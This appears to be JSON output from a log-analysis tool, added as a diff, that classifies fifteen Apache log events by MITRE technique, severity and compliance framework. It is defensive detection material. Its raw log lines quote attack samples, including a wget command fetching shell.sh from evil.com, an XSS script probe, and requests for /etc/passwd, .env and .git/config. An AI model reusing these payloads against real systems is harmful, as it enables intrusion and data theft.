@@ -1,0 +1,365 @@
+{
+  "events": [
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.297227",
+      "hostname": "server1",
+      "log_type": "apache_error",
+      "source_ip": "198.51.100.25",
+      "description": "PHP Code Execution Attempt",
+      "mitre": [
+        {
+          "technique_id": "T1505",
+          "technique_name": "T1505"
+        }
+      ],
+      "severity": "critical",
+      "compliance": [
+        "PCI_DSS",
+        "GDPR",
+        "HIPAA",
+        "ISO_27001"
+      ],
+      "raw_log": "[Mon Feb 20 10:20:00.567890 2026] [error] [client 198.51.100.25] PHP Warning: eval() called in /var/www/html/data.php on line 42"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.297213",
+      "hostname": "server1",
+      "log_type": "apache_error",
+      "source_ip": "203.0.113.50",
+      "description": "Missing PHP File - Scanner Activity",
+      "mitre": [
+        {
+          "technique_id": "T1083",
+          "technique_name": "T1083"
+        }
+      ],
+      "severity": "low",
+      "compliance": [
+        "PCI_DSS",
+        "NIST"
+      ],
+      "raw_log": "[Mon Feb 20 10:19:00.456789 2026] [error] [client 203.0.113.50] File does not exist: /var/www/html/wp-config.php"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.297191",
+      "hostname": "server1",
+      "log_type": "apache_error",
+      "source_ip": "192.168.1.100",
+      "description": "CGI Timeout - Possible Backdoor",
+      "mitre": [
+        {
+          "technique_id": "T1505",
+          "technique_name": "T1505"
+        }
+      ],
+      "severity": "medium",
+      "compliance": [
+        "PCI_DSS",
+        "GDPR",
+        "HIPAA",
+        "ISO_27001"
+      ],
+      "raw_log": "[Mon Feb 20 10:18:00.345678 2026] [error] [client 192.168.1.100] Timeout waiting for output from CGI: /cgi-bin/backdoor.sh"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.296993",
+      "hostname": "server1",
+      "log_type": "apache_error",
+      "source_ip": "203.0.113.50",
+      "description": "Access Denied by Configuration",
+      "mitre": [
+        {
+          "technique_id": "T1083",
+          "technique_name": "T1083"
+        }
+      ],
+      "severity": "low",
+      "compliance": [
+        "PCI_DSS",
+        "NIST"
+      ],
+      "raw_log": "[Mon Feb 20 10:16:00.123456 2026] [error] [client 203.0.113.50] client denied by server configuration: /var/www/html/.env"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.296888",
+      "hostname": "server1",
+      "log_type": "apache_error",
+      "source_ip": "192.168.1.100",
+      "description": "PHP Code Execution Attempt",
+      "mitre": [
+        {
+          "technique_id": "T1505",
+          "technique_name": "T1505"
+        }
+      ],
+      "severity": "critical",
+      "compliance": [
+        "PCI_DSS",
+        "GDPR",
+        "HIPAA",
+        "ISO_27001"
+      ],
+      "raw_log": "[Mon Feb 20 10:15:23.234567 2026] [error] [client 192.168.1.100] PHP Fatal error: Call to undefined function eval() in /var/www/html/shell.php on line 5"
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.296709",
+      "hostname": "server1",
+      "log_type": "apache_access",
+      "source_ip": "203.0.113.50",
+      "request_url": "/login.php",
+      "http_status": 200,
+      "description": "Security Scanner Detected",
+      "mitre": [
+        {
+          "technique_id": "T1046",
+          "technique_name": "T1046"
+        }
+      ],
+      "severity": "high",
+      "compliance": [
+        "SOC2"
+      ],
+      "raw_log": "203.0.113.50 - - [20/Feb/2026:10:21:00 +0000] \"GET /login.php HTTP/1.1\" 200 4521 \"-\" \"sqlmap/1.6\""
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.296614",
+      "hostname": "server1",
+      "log_type": "apache_access",
+      "source_ip": "198.51.100.25",
+      "request_url": "/server-status",
+      "http_status": 403,
+      "description": "Authentication Failure",
+      "mitre": [
+        {
+          "technique_id": "T1110",
+          "technique_name": "T1110"
+        }
+      ],
+      "severity": "medium",
+      "compliance": [
+        "PCI_DSS",
+        "GDPR",
+        "HIPAA",
+        "SOC2",
+        "NIST",
+        "ISO_27001"
+      ],
+      "raw_log": "198.51.100.25 - - [20/Feb/2026:10:20:00 +0000] \"GET /server-status HTTP/1.1\" 403 234 \"-\" \"Apache/2.4.41\""
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.296564",
+      "hostname": "server1",
+      "log_type": "apache_access",
+      "source_ip": "203.0.113.50",
+      "request_url": "/admin.php?cmd=wget",
+      "http_status": 500,
+      "description": "Remote File Inclusion Attempt",
+      "mitre": [
+        {
+          "technique_id": "T1190",
+          "technique_name": "T1190"
+        }
+      ],
+      "severity": "critical",
+      "compliance": [
+        "PCI_DSS",
+        "GDPR",
+        "HIPAA",
+        "SOC2",
+        "NIST",
+        "ISO_27001"
+      ],
+      "raw_log": "203.0.113.50 - - [20/Feb/2026:10:19:30 +0000] \"GET /admin.php?cmd=wget http://evil.com/shell.sh HTTP/1.1\" 500 567 \"-\" \"curl/7.68.0\""
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.296525",
+      "hostname": "server1",
+      "log_type": "apache_access",
+      "source_ip": "192.168.1.100",
+      "request_url": "/phpmyadmin/",
+      "http_status": 404,
+      "description": "Directory/File Enumeration",
+      "mitre": [
+        {
+          "technique_id": "T1083",
+          "technique_name": "T1083"
+        }
+      ],
+      "severity": "medium",
+      "compliance": [
+        "PCI_DSS",
+        "NIST"
+      ],
+      "raw_log": "192.168.1.100 - - [20/Feb/2026:10:19:00 +0000] \"GET /phpmyadmin/ HTTP/1.1\" 404 234 \"-\" \"Mozilla/5.0\""
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.296488",
+      "hostname": "server1",
+      "log_type": "apache_access",
+      "source_ip": "45.33.32.156",
+      "request_url": "/.git/config",
+      "http_status": 403,
+      "description": "Directory/File Enumeration",
+      "mitre": [
+        {
+          "technique_id": "T1083",
+          "technique_name": "T1083"
+        }
+      ],
+      "severity": "medium",
+      "compliance": [
+        "PCI_DSS",
+        "NIST"
+      ],
+      "raw_log": "45.33.32.156 - - [20/Feb/2026:10:18:30 +0000] \"GET /.git/config HTTP/1.1\" 403 234 \"-\" \"git/2.30.0\""
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.296450",
+      "hostname": "server1",
+      "log_type": "apache_access",
+      "source_ip": "198.51.100.25",
+      "request_url": "/api.php?cmd=<script>alert(1)</script>",
+      "http_status": 500,
+      "description": "Cross-Site Scripting Attempt",
+      "mitre": [
+        {
+          "technique_id": "T1189",
+          "technique_name": "T1189"
+        }
+      ],
+      "severity": "high",
+      "compliance": [],
+      "raw_log": "198.51.100.25 - - [20/Feb/2026:10:18:00 +0000] \"GET /api.php?cmd=<script>alert(1)</script> HTTP/1.1\" 500 342 \"-\" \"Mozilla/5.0\""
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.296425",
+      "hostname": "server1",
+      "log_type": "apache_access",
+      "source_ip": "203.0.113.50",
+      "request_url": "/etc/passwd",
+      "http_status": 403,
+      "description": "Path Traversal Attempt",
+      "mitre": [
+        {
+          "technique_id": "T1083",
+          "technique_name": "T1083"
+        }
+      ],
+      "severity": "high",
+      "compliance": [
+        "PCI_DSS",
+        "NIST"
+      ],
+      "raw_log": "203.0.113.50 - - [20/Feb/2026:10:17:30 +0000] \"GET /etc/passwd HTTP/1.1\" 403 234 \"-\" \"Mozilla/5.0\""
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.296396",
+      "hostname": "server1",
+      "log_type": "apache_access",
+      "source_ip": "192.168.1.100",
+      "request_url": "/wp-content/plugins",
+      "http_status": 404,
+      "description": "Directory/File Enumeration",
+      "mitre": [
+        {
+          "technique_id": "T1083",
+          "technique_name": "T1083"
+        }
+      ],
+      "severity": "medium",
+      "compliance": [
+        "PCI_DSS",
+        "NIST"
+      ],
+      "raw_log": "192.168.1.100 - - [20/Feb/2026:10:17:00 +0000] \"GET /wp-content/plugins HTTP/1.1\" 404 234 \"-\" \"nikto/2.1.6\""
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.296089",
+      "hostname": "server1",
+      "log_type": "apache_access",
+      "source_ip": "192.168.1.100",
+      "request_url": "/admin",
+      "http_status": 401,
+      "description": "Authentication Failure",
+      "mitre": [
+        {
+          "technique_id": "T1110",
+          "technique_name": "T1110"
+        }
+      ],
+      "severity": "medium",
+      "compliance": [
+        "PCI_DSS",
+        "GDPR",
+        "HIPAA",
+        "SOC2",
+        "NIST",
+        "ISO_27001"
+      ],
+      "raw_log": "192.168.1.100 - - [20/Feb/2026:10:15:24 +0000] \"GET /admin HTTP/1.1\" 401 532 \"-\" \"Mozilla/5.0\""
+    },
+    {
+      "timestamp_utc": "2026-02-24T12:48:28.296002",
+      "hostname": "server1",
+      "log_type": "apache_access",
+      "source_ip": "192.168.1.100",
+      "request_url": "/admin",
+      "http_status": 401,
+      "description": "Authentication Failure",
+      "mitre": [
+        {
+          "technique_id": "T1110",
+          "technique_name": "T1110"
+        }
+      ],
+      "severity": "medium",
+      "compliance": [
+        "PCI_DSS",
+        "GDPR",
+        "HIPAA",
+        "SOC2",
+        "NIST",
+        "ISO_27001"
+      ],
+      "raw_log": "192.168.1.100 - - [20/Feb/2026:10:15:23 +0000] \"GET /admin HTTP/1.1\" 401 532 \"-\" \"Mozilla/5.0\""
+    }
+  ],
+  "statistics": {
+    "total_events": 15,
+    "by_type": {
+      "apache_error": 5,
+      "apache_access": 10
+    },
+    "by_severity": {
+      "critical": 3,
+      "low": 2,
+      "medium": 7,
+      "high": 3
+    },
+    "by_compliance": {
+      "PCI_DSS": 13,
+      "GDPR": 7,
+      "HIPAA": 7,
+      "ISO_27001": 7,
+      "NIST": 10,
+      "SOC2": 5
+    },
+    "top_attackers": {
+      "198.51.100.25": 3,
+      "203.0.113.50": 5,
+      "192.168.1.100": 6,
+      "45.33.32.156": 1
+    },
+    "top_urls": {
+      "/login.php": 1,
+      "/server-status": 1,
+      "/admin.php?cmd=wget": 1,
+      "/phpmyadmin/": 1,
+      "/.git/config": 1,
+      "/api.php?cmd=<script>alert(1)</script>": 1,
+      "/etc/passwd": 1,
+      "/wp-content/plugins": 1,
+      "/admin": 2
+    }
+  }
+}
